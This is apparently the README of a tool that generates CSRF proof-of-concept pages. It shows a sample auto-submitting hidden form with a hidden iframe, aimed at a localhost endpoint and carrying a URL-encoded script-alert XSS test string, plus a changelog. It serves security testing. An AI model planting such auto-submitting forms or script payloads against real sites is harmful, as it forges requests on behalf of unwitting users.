# CSRFPoCGenerator
generate CSRF PoC

---

## Parameters

- URL : Set URL
- method : Set method
- enctype : Select enctype
- params : Set URL encoded parameters
- title : Downloadable HTML title

## How to use

Click "generate and submit" to generate form & submit request.

Click "generate only" to just generate form.

Click "download HTML" to download CSRF PoC HTML.

## Example

Enter the following values.

- URL
```
http://localhost/post.php
```

- method
```
POST
```

- enctype
```
application/x-www-form-urlencoded (default)
```

- params
```
title=CSRF&name=hello+world&comment=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
```

Then click "generate only" (or "generate and submit" ) and Output a HTML form (and submit request ).
```
<form target="dummyfrm" name="evilform" action="http://localhost/post.php" method="POST" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="title" value="CSRF" />
<input type="hidden" name="name" value="hello world" />
<input type="hidden" name="comment" value="&lt;script&gt;alert(1);&lt;/script&gt;
" />
</form>
<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>
```

- title
```
Hello CSRF PoC
```
Then click "download HTML" and download a HTML file.
```
<!DOCTYPE html>

<html>
<head>
<meta charset="utf-8">
<title>Hello CSRF PoC</title>
</head>
<body onload="document.evilform.submit();">
<form target="dummyfrm" name="evilform" action="http://localhost/post.php" method="POST" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="title" value="CSRF" />
<input type="hidden" name="name" value="hello world" />
<input type="hidden" name="comment" value="&lt;script&gt;alert(1);&lt;/script&gt;" />
</form>
<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>
<p>Hello CSRF PoC</p>
</body>
</html>
```

---

# Other

## URL encoding

- URLencode : Set string
```
<script>alert(1);</script>
```

Then click "URL encode" and encode input string.
```
%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
```

---

# Change log

v1.3

- added XHR multipart/form-data transmission
- added an option to send automatinally
- arvitrary enctype

v1.2

- added XHR mode

v1.1

- added enctype setting
- added download function
- fixed typo

